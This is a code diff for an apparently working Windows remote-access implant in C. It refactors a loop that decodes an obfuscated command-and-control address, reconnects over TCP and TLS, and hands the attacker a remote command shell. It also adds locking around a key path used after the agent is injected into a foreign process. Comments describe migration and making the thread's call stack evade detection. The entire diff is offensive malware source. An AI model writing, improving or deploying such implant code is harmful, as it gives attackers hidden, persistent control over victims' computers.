@@ -39,26 +39,47 @@
 char g_key_path[MAX_PATH * 2] = {0};   /* extern'd by inject.c for RVA calc */
 static DWORD WINAPI _agent_thread(LPVOID lpParam);  /* forward decl */
 
+/* ── g_key_path lock ─────────────────────────────────────────────────────── */
+/* Protects concurrent writes to g_key_path from WinMain/AgentRun/DllMain.   */
+/* Initialised once before any thread is started; used with a simple spinlock */
+/* approach: CRITICAL_SECTION init is idempotent so both callers initialise  */
+/* independently — the OS loader lock serialises DllMain vs WinMain, and     */
+/* AgentRun is called after DllMain returns.                                  */
+static CRITICAL_SECTION g_key_path_cs;
+static BOOL             g_key_path_cs_init = FALSE;
+
+static void _key_path_lock_init(void)
+{
+    if (!g_key_path_cs_init) {
+        InitializeCriticalSection(&g_key_path_cs);
+        g_key_path_cs_init = TRUE;
+    }
+}
+
 static void resolve_key_path(void)
 {
     /* Start from the EXE's own full path */
     char exePath[MAX_PATH] = {0};
     DWORD pathLen = GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1);
+
+    char tmp[MAX_PATH * 2] = {0};
     if (pathLen == 0) {
-        strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
-        return;
+        strncpy(tmp, SECRET_KEY_PATH, sizeof(tmp) - 1);
+    } else {
+        /* Strip the filename to get just the directory */
+        char *last = strrchr(exePath, '\\');
+        if (last) {
+            *(last + 1) = '\0';                       /* keep trailing backslash */
+            snprintf(tmp, sizeof(tmp), "%s%s", exePath, SECRET_KEY_PATH);
+        } else {
+            strncpy(tmp, SECRET_KEY_PATH, sizeof(tmp) - 1);
+        }
     }
 
-    /* Strip the filename to get just the directory */
-    char *last = strrchr(exePath, '\\');
-    if (last) {
-        *(last + 1) = '\0';                         /* keep trailing backslash */
-        snprintf(g_key_path, sizeof(g_key_path),
-                 "%s%s", exePath, SECRET_KEY_PATH); /* e.g. C:\...\secret.key */
-    } else {
-        /* No directory separator — just use the relative path as fallback */
-        strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
-    }
+    _key_path_lock_init();
+    EnterCriticalSection(&g_key_path_cs);
+    strncpy(g_key_path, tmp, sizeof(g_key_path) - 1);
+    LeaveCriticalSection(&g_key_path_cs);
 }
 
 
@@ -173,6 +194,160 @@ static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
 }
 
 #endif /* SECRET_KEY_BYTES */
+
+
+/* ── _agent_reconnect_loop ───────────────────────────────────────────────── */
+/*
+ * Shared TCP reconnect + TLS + shell loop used by both WinMain and
+ * _agent_thread.  Extracted to eliminate the ~95% code duplication between
+ * those two functions.
+ *
+ * Parameters
+ * ----------
+ *   logPrefix : short string prepended to each debug log message (e.g. "WM" /
+ *               "AT") to distinguish WinMain from _agent_thread calls in logs.
+ *   wsaCleanOnExit : when TRUE, calls WSACleanup() before returning on error.
+ *                    WinMain passes TRUE; _agent_thread passes TRUE too.
+ *
+ * Returns 0 on clean exit (unreachable in practice — loop is infinite),
+ *         non-zero on fatal error (key load failure or bad C2_IP).
+ */
+static int _agent_reconnect_loop(const char *logPrefix, BOOL wsaCleanOnExit)
+{
+    BYTE secretKey[SECRET_KEY_LEN];
+    {
+        BOOL _key_ok = load_secret_key(g_key_path, secretKey);
+        DBG_KEY(g_key_path, _key_ok);
+        if (!_key_ok) {
+            if (wsaCleanOnExit) WSACleanup();
+            DBG_LOG(DBG_SS_KEY, DBG_ERR, "%s: key load failed", logPrefix);
+            DBG_CLOSE();
+            return 1;
+        }
+    }
+
+    char _c2_ip_buf[64] = {0};
+    c2_ip_decode(_c2_ip_buf, sizeof(_c2_ip_buf));
+    WORD _c2_port = c2_port_decode();
+
+    while (1) {
+        DBG_LOG(DBG_SS_NET, DBG_INFO, "%s: reconnect loop — creating socket", logPrefix);
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == INVALID_SOCKET) {
+            DBG_LOG(DBG_SS_NET, DBG_WARN, "%s: socket() failed — retrying", logPrefix);
+            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
+            continue;
+        }
+
+        struct sockaddr_in addr;
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_port   = htons(_c2_port);
+
+        if (InetPtonA(AF_INET, _c2_ip_buf, &addr.sin_addr) != 1) {
+            DBG_LOG(DBG_SS_NET, DBG_ERR,
+                    "%s: InetPtonA('%s') failed — bad C2_IP, exiting",
+                    logPrefix, _c2_ip_buf);
+            closesocket(sock);
+            if (wsaCleanOnExit) WSACleanup();
+            DBG_CLOSE();
+            return 4;
+        }
+        DBG_LOG(DBG_SS_NET, DBG_INFO, "%s: connecting to %s:%d",
+                logPrefix, _c2_ip_buf, (int)_c2_port);
+
+        /* Inner connect-retry loop; breaks to outer on sustained socket() failure */
+        {
+            int _sock_fail = 0;
+            for (;;) {
+                if (sock == INVALID_SOCKET) {
+                    DBG_LOG(DBG_SS_NET, DBG_WARN,
+                            "%s: socket() failed — breaking to outer loop", logPrefix);
+                    break;
+                }
+                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
+                    break;
+                DBG_LOG(DBG_SS_NET, DBG_WARN,
+                        "%s: connect(%s:%d) failed (WSAErr=%d) — retrying",
+                        logPrefix, _c2_ip_buf, (int)_c2_port, WSAGetLastError());
+                closesocket(sock);
+                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
+                sock = socket(AF_INET, SOCK_STREAM, 0);
+                if (sock == INVALID_SOCKET) {
+                    _sock_fail++;
+                    DBG_LOG(DBG_SS_NET, DBG_WARN,
+                            "%s: socket() failed after retry (%d)", logPrefix, _sock_fail);
+                    if (_sock_fail >= 3) {
+                        DBG_LOG(DBG_SS_NET, DBG_WARN,
+                                "%s: socket() failed 3 times — retrying outer loop", logPrefix);
+                        break;
+                    }
+                    sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
+                } else {
+                    _sock_fail = 0;
+                }
+            }
+        }
+
+        if (sock == INVALID_SOCKET) {
+            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
+            continue;
+        }
+        DBG_LOG(DBG_SS_NET, DBG_OK, "%s: TCP connected to %s:%d",
+                logPrefix, _c2_ip_buf, (int)_c2_port);
+
+        /* Socket options */
+        {
+            DWORD to = TLS_RECV_TIMEOUT_MS;
+            int _r1 = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
+            DWORD ka = 1;
+            int _r2 = setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char *)&ka, sizeof(ka));
+            DBG_LOG(DBG_SS_SOCK, (_r1|_r2) ? DBG_WARN : DBG_OK,
+                    "%s: setsockopt SO_RCVTIMEO=%d SO_KEEPALIVE=%d (0=ok)",
+                    logPrefix, _r1, _r2);
+        }
+
+        TLS_CONTEXT tls;
+        ZeroMemory(&tls, sizeof(tls));
+        {
+            BOOL _tls_ok = tls_connect(&tls, sock, _c2_ip_buf, secretKey);
+            DBG_TLS(_tls_ok, tls.lastErr);
+            if (!_tls_ok) {
+                closesocket(sock);
+                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
+                continue;
+            }
+        }
+        DBG_LOG(DBG_SS_TLS, DBG_OK, "%s: TLS connected to %s:%d — entering shell loop",
+                logPrefix, _c2_ip_buf, (int)_c2_port);
+
+        /* Wipe key immediately after seeding TLS — tls_connect() copied it */
+        SecureZeroMemory(secretKey, sizeof(secretKey));
+
+        DBG_LOG(DBG_SS_SHELL, DBG_INFO, "%s: shell_run() — entering command loop", logPrefix);
+        shell_run(&tls);
+        DBG_LOG(DBG_SS_SHELL, DBG_WARN, "%s: shell_run() returned — session ended", logPrefix);
+
+        tls_disconnect(&tls);
+        closesocket(sock);
+
+        /* Reload key for next connection; g_key_path is still valid */
+        {
+            BOOL _rk = load_secret_key(g_key_path, secretKey);
+            DBG_KEY(g_key_path, _rk);
+            if (!_rk) {
+                DBG_LOG(DBG_SS_KEY, DBG_ERR,
+                        "%s: key reload failed after session — exiting", logPrefix);
+                if (wsaCleanOnExit) WSACleanup();
+                DBG_CLOSE();
+                return 1;
+            }
+        }
+
+        sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
+    }
+    /* Unreachable */
+}
 
 
 /* ── WinMain ────────────────────────────────────────────────────────────── */
@@ -325,144 +500,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     DBG_LOG(DBG_SS_NET, DBG_OK, "WSAStartup OK (Winsock %u.%u)",
             LOBYTE(wsa.wVersion), HIBYTE(wsa.wVersion));
 
-    /* ── 5. Load shared secret ───────────────────────────────────────── */
-    BYTE secretKey[SECRET_KEY_LEN];
-    {
-        BOOL _key_ok = load_secret_key(g_key_path, secretKey);
-        DBG_KEY(g_key_path, _key_ok);
-        if (!_key_ok) {
-            WSACleanup();
-            DBG_LOG(DBG_SS_KEY, DBG_ERR, "key load failed — returning 0x01");
-            DBG_CLOSE();
-            return 0x01;
-        }
-        /* Wipe the path string so it doesn't linger in .data or a heap dump.
-         * The key bytes are already decoded into secretKey above.           */
-        SecureZeroMemory(g_key_path, sizeof(g_key_path));
-    }
-
-    /* ── 6. Reconnect loop ───────────────────────────────────────────── */
-    /* Decode C2 address once — stored in a stack buffer for the loop.   *
-     * SecureZeroMemory after the loop (unreachable in practice, but      *
-     * zero it here for hygiene anyway).                                  */
-    char _c2_ip_buf[64] = {0};
-    c2_ip_decode(_c2_ip_buf, sizeof(_c2_ip_buf));
-    WORD _c2_port = c2_port_decode();
-
-    while (1) {
-
-        /* BUG 6: a new socket must be created on every outer iteration.
-         * The old code created the socket once outside the inner retry
-         * loop, so a failed connect() that consumed the socket (e.g.
-         * WSAETIMEDOUT on some stacks) would leak it.                   */
-        DBG_LOG(DBG_SS_NET, DBG_INFO, "reconnect loop — creating socket");
-        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == INVALID_SOCKET) {
-            DBG_LOG(DBG_SS_NET, DBG_WARN, "socket() failed — retrying");
-            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-            continue;
-        }
-
-        struct sockaddr_in addr;
-        memset(&addr, 0, sizeof(addr));
-        addr.sin_family = AF_INET;
-        addr.sin_port   = htons(_c2_port);
-
-        /* BUG 5: inet_addr() is deprecated, rejects IPv6, and returns
-         * INADDR_NONE for "255.255.255.255" without any error indicator.
-         * InetPtonA handles both IPv4 and IPv6 correctly.               */
-        if (InetPtonA(AF_INET, _c2_ip_buf, &addr.sin_addr) != 1) {
-            /* C2_IP is a compile-time constant; if it fails here the
-             * build itself is misconfigured — exit rather than loop.   */
-            DBG_LOG(DBG_SS_NET, DBG_ERR,
-                    "InetPtonA('%s') failed — bad C2_IP at build time, exiting 0x04", _c2_ip_buf);
-            closesocket(sock);
-            WSACleanup();
-            DBG_CLOSE();
-            return 0x04;
-        }
-        DBG_LOG(DBG_SS_NET, DBG_INFO, "connecting to %s:%d", _c2_ip_buf, (int)_c2_port);
-
-        /* Retry TCP connect; recreate socket on each failure to avoid
-         * using a socket that may have been put into an error state.   */
-        for (;;) {
-            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
-                break;
-            DBG_LOG(DBG_SS_NET, DBG_WARN,
-                    "connect(%s:%d) failed (WSAErr=%d) — retrying", _c2_ip_buf, (int)_c2_port, WSAGetLastError());
-            closesocket(sock);
-            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-            sock = socket(AF_INET, SOCK_STREAM, 0);
-            if (sock == INVALID_SOCKET) {
-                DBG_LOG(DBG_SS_NET, DBG_WARN, "socket() failed after connect retry — will retry again");
-                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-            }
-        }
-
-        if (sock == INVALID_SOCKET) {
-            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-            continue;
-        }
-        DBG_LOG(DBG_SS_NET, DBG_OK, "TCP connected to %s:%d", _c2_ip_buf, (int)_c2_port);
-
-        /* ── Socket options — set once, after connect(), before TLS ──── */
-        {
-            DWORD to = TLS_RECV_TIMEOUT_MS;
-            int _r1 = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
-            DWORD ka = 1;
-            int _r2 = setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char *)&ka, sizeof(ka));
-            DBG_LOG(DBG_SS_SOCK, (_r1|_r2) ? DBG_WARN : DBG_OK,
-                    "setsockopt SO_RCVTIMEO=%d SO_KEEPALIVE=%d (0=ok)",
-                    _r1, _r2);
-        }
-
-        /* TLS handshake + HMAC auth + protocol v2 negotiation */
-        TLS_CONTEXT tls;
-        ZeroMemory(&tls, sizeof(tls));
-        {
-            BOOL _tls_ok = tls_connect(&tls, sock, _c2_ip_buf, secretKey);
-            DBG_TLS(_tls_ok, tls.lastErr);
-            if (!_tls_ok) {
-                closesocket(sock);
-                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-                continue;
-            }
-        }
-        DBG_LOG(DBG_SS_TLS, DBG_OK, "TLS connected to %s:%d — entering shell loop", _c2_ip_buf, (int)_c2_port);
-
-        /* BUG 7: wipe the key immediately after seeding the TLS context
-         * so it does not linger in the stack frame for the rest of the
-         * session duration.  tls_connect() copies it into sessionKey.  */
-        SecureZeroMemory(secretKey, sizeof(secretKey));
-
-        /* Shell command loop — blocks until the C2 disconnects or
-         * sends "exit" / "q".  shell_run() calls tls_disconnect()
-         * and WSACleanup() internally on a clean exit verb.           */
-        DBG_LOG(DBG_SS_SHELL, DBG_INFO, "shell_run() — entering command loop");
-        shell_run(&tls);
-        DBG_LOG(DBG_SS_SHELL, DBG_WARN,
-                "shell_run() returned — session ended (disconnect or 'q')");
-
-        tls_disconnect(&tls);
-        closesocket(sock);
-
-        /* Reload the secret key for the next connection attempt */
-        {
-            BOOL _rk = load_secret_key(g_key_path, secretKey);
-            DBG_KEY(g_key_path, _rk);
-            if (!_rk) {
-                DBG_LOG(DBG_SS_KEY, DBG_ERR,
-                        "key reload failed after session — giving up, returning 0x01");
-                WSACleanup();
-                DBG_CLOSE();
-                return 0x01;
-            }
-        }
-
-        sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-    }
-
-    /* Unreachable; WSACleanup / SecureZeroMemory called above */
+    /* ── 5+6. Key load + reconnect loop ────────────────────────────────── */
+    /* Delegated to _agent_reconnect_loop() which handles both key loading  *
+     * and the infinite TCP/TLS/shell retry loop — extracted to eliminate   *
+     * the duplication with _agent_thread (DESIGN fix).                     */
+    return _agent_reconnect_loop("WM", TRUE);
 }
 
 /* ── AgentRun — exported entry point called by the bootstrap after migration ─
@@ -492,6 +534,10 @@ __declspec(dllexport) void AgentRun(void)
         if (modLen == 0) hSelf = NULL;  /* treat as unresolved on failure */
     }
 
+    /* Write g_key_path under the lock — may race with DllMain on a
+     * background thread if a third party calls LoadLibrary concurrently.    */
+    _key_path_lock_init();
+    EnterCriticalSection(&g_key_path_cs);
     char *last = strrchr(modPath, '\\');
     if (last) {
         *(last + 1) = '\0';
@@ -500,6 +546,7 @@ __declspec(dllexport) void AgentRun(void)
         strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
     }
     /* else g_key_path was already set by WinMain's resolve_key_path() */
+    LeaveCriticalSection(&g_key_path_cs);
 
     /* F-11: submit via threadpool so the thread call-stack shows
      * ntdll!TppWorkerThread rather than a private RX address.     */
@@ -546,102 +593,8 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
     DBG_LOG(DBG_SS_NET, DBG_OK, "_agent_thread: WSAStartup OK (Winsock %u.%u)",
             LOBYTE(wsa.wVersion), HIBYTE(wsa.wVersion));
 
-    BYTE secretKey[SECRET_KEY_LEN];
-    {
-        BOOL _k = load_secret_key(g_key_path, secretKey);
-        DBG_KEY(g_key_path, _k);
-        if (!_k) { WSACleanup(); return 1; }
-    }
-
-    char _c2_ip_buf[64] = {0};
-    c2_ip_decode(_c2_ip_buf, sizeof(_c2_ip_buf));
-    WORD _c2_port = c2_port_decode();
-
-    while (1) {
-        DBG_LOG(DBG_SS_NET, DBG_INFO, "_agent_thread: reconnect loop — creating socket");
-        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock == INVALID_SOCKET) {
-            DBG_LOG(DBG_SS_NET, DBG_WARN, "_agent_thread: socket() failed — retrying");
-            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-            continue;
-        }
-
-        struct sockaddr_in addr;
-        memset(&addr, 0, sizeof(addr));
-        addr.sin_family = AF_INET;
-        addr.sin_port   = htons(_c2_port);
-
-        if (InetPtonA(AF_INET, _c2_ip_buf, &addr.sin_addr) != 1) {
-            DBG_LOG(DBG_SS_NET, DBG_ERR,
-                    "_agent_thread: InetPtonA('%s') failed — bad C2_IP", _c2_ip_buf);
-            closesocket(sock); WSACleanup(); return 4;
-        }
-        DBG_LOG(DBG_SS_NET, DBG_INFO, "_agent_thread: connecting to %s:%d", _c2_ip_buf, (int)_c2_port);
-
-        for (;;) {
-            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
-                break;
-            DBG_LOG(DBG_SS_NET, DBG_WARN,
-                    "_agent_thread: connect(%s:%d) failed (WSAErr=%d) — retrying",
-                    _c2_ip_buf, (int)_c2_port, WSAGetLastError());
-            closesocket(sock);
-            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-            sock = socket(AF_INET, SOCK_STREAM, 0);
-            if (sock == INVALID_SOCKET) {
-                DBG_LOG(DBG_SS_NET, DBG_WARN, "_agent_thread: socket() failed after retry");
-                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-            }
-        }
-        if (sock == INVALID_SOCKET) { sleep_obf_delay(RECONNECT_DELAY_SEC * 1000); continue; }
-        DBG_LOG(DBG_SS_NET, DBG_OK, "_agent_thread: TCP connected to %s:%d", _c2_ip_buf, (int)_c2_port);
-
-        /* SO_RCVTIMEO + SO_KEEPALIVE */
-        {
-            DWORD to = TLS_RECV_TIMEOUT_MS;
-            int _r1 = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
-            DWORD ka = 1;
-            int _r2 = setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char *)&ka, sizeof(ka));
-            DBG_LOG(DBG_SS_SOCK, (_r1|_r2) ? DBG_WARN : DBG_OK,
-                    "_agent_thread: setsockopt SO_RCVTIMEO=%d SO_KEEPALIVE=%d (0=ok)",
-                    _r1, _r2);
-        }
-
-        TLS_CONTEXT tls;
-        ZeroMemory(&tls, sizeof(tls));
-        {
-            BOOL _tok = tls_connect(&tls, sock, _c2_ip_buf, secretKey);
-            DBG_TLS(_tok, tls.lastErr);
-            if (!_tok) {
-                closesocket(sock);
-                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-                continue;
-            }
-        }
-        DBG_LOG(DBG_SS_TLS, DBG_OK,
-                "_agent_thread: TLS connected to %s:%d — entering shell loop", _c2_ip_buf, (int)_c2_port);
-
-        SecureZeroMemory(secretKey, sizeof(secretKey));
-
-        DBG_LOG(DBG_SS_SHELL, DBG_INFO, "_agent_thread: shell_run() — entering command loop");
-        shell_run(&tls);
-        DBG_LOG(DBG_SS_SHELL, DBG_WARN,
-                "_agent_thread: shell_run() returned — session ended");
-
-        tls_disconnect(&tls);
-        closesocket(sock);
-
-        {
-            BOOL _rk = load_secret_key(g_key_path, secretKey);
-            DBG_KEY(g_key_path, _rk);
-            if (!_rk) {
-                DBG_LOG(DBG_SS_KEY, DBG_ERR,
-                        "_agent_thread: key reload failed — thread exiting");
-                WSACleanup();
-                return 1;
-            }
-        }
-        sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
-    }
+    /* Delegate to shared reconnect loop — handles key load + infinite retry */
+    return (DWORD)_agent_reconnect_loop("AT", TRUE);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
@@ -652,11 +605,18 @@ BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
 
         /* Resolve absolute path to secret.key from our own module's location.
          * GetModuleFileNameA(hModule) returns the path of our loaded .exe file
-         * even when it is loaded as a DLL inside a foreign process.           */
+         * even when it is loaded as a DLL inside a foreign process.
+         * Write under the lock to serialise with AgentRun() on any concurrent
+         * background thread (DllMain itself holds the loader lock, but
+         * AgentRun is called on a different thread after DllMain returns).   */
         char modPath[MAX_PATH] = {0};
         DWORD modLen = GetModuleFileNameA(hModule, modPath, sizeof(modPath) - 1);
+
+        _key_path_lock_init();
+        EnterCriticalSection(&g_key_path_cs);
         if (modLen == 0) {
             strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
+            LeaveCriticalSection(&g_key_path_cs);
             return TRUE;
         }
         char *last = strrchr(modPath, '\\');
@@ -666,6 +626,7 @@ BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
         } else {
             strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
         }
+        LeaveCriticalSection(&g_key_path_cs);
 
 #ifdef DEBUG_DLLMAIN_MSGBOX
         /* Debug probe: write key path + load result to a temp file */
